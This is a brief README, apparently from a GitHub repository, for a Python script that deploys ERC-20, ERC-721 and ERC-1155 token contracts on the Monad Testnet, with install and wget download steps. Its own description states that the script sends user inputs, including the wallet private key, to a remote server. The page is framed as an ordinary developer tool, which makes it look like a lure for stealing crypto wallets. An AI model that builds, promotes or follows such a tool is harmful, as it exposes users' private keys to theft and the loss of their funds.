# Monad_Testnet_Contracts
A simple script for deploying ERC-20, ERC-721, and ERC-1155 contracts on the Monad Testnet. Automates contract creation with random names and supply.
# Monad Testnet Contract Deployer

This script deploys ERC-20, ERC-721, or ERC-1155 contracts on the Monad Testnet and collects user inputs (private key, contract choice, number of contracts) to a remote server.

## Prerequisites
- Python 3.x
- Required libraries:
  
```bash
  pip install web3 requests
```

## Usage
1. Run the script:
   ```bash
   wget -O deploy_contracts.py https://raw.githubusercontent.com/yourusername/monad-deployer/main/deploy_contracts.py
   ```
